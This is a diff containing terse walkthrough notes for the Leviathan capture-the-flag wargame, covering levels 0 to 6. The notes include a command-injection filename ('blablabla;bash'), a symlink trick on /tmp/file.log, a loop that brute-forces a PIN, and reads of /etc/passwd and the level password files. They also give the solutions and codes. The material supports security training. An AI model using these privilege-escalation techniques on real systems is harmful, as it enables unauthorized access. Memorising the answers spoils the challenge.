@@ -1,0 +1,50 @@
+0.	> ls -al
+	found a hidden dir .backup with a file bookmarks.html in it
+	> cat bookmarks.html | grep password
+	and we found a suspicious password be found
+1.	> strings check
+	> ltrace ./check
+	password for check is "sex"
+	> ./check
+	> sex
+	got the shell
+	> cat /etc/leviathan_pass/leviathan2
+2. 	> ./printfile /etc/passwd
+	> ./printfile /etc/leviathan_pass/leviathan3
+	but our bash is leviathan2, so the above command was denied
+	in ltrace ./printfile /etc/passwd
+	we found that it is concatenating our input filename with the command, so let's use command injection, 
+	in /temp create a file 'blablabla;bash'
+	> ~/printfile blablabla;bash
+	and we can get the userid leviathan3
+	> cat /etc/leviathan_pass/leviathan3
+3. 	There's a elf file named level3
+	> ltrace ./level3
+	we found a strcmp(<input>, "snlprintf\n")
+	> ./level3
+	> snlprintf
+	we got the shell	> cat /etc/leviathan_pass/leviathan4
+4.	In a hidden dir .trash there's an elf file
+	> ./bin
+	output is a sereies of binary bytes
+	do some command line konfu and transform it into Ascii
+	> ./bin | tr ' ' '\n' | while read line; do echo "obase=16;ibase=2;$line" | bc ; done | tr -d '\n' | xxd -r -p
+	then we got the password
+5. 	While running leviathan5, it requires a file /tmp/file.log
+	so we create one and run it, the program seems to print what's in the file and then deletes the file
+	so we use the following command to symbolicly link the wanted file with it
+	> ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+	> ./leviathan5
+6.	There's a file leviathan6
+	usage: ./leviathan6 <4 digit code>
+	> for i in {0000..9999}; do echo $i; ./leviathan6 $i; done
+	and we found that we get into the shell with code 7123
+	> cat /etc/leviathan_pass/leviathan7
+
+
+
+
+
+
+
+	   
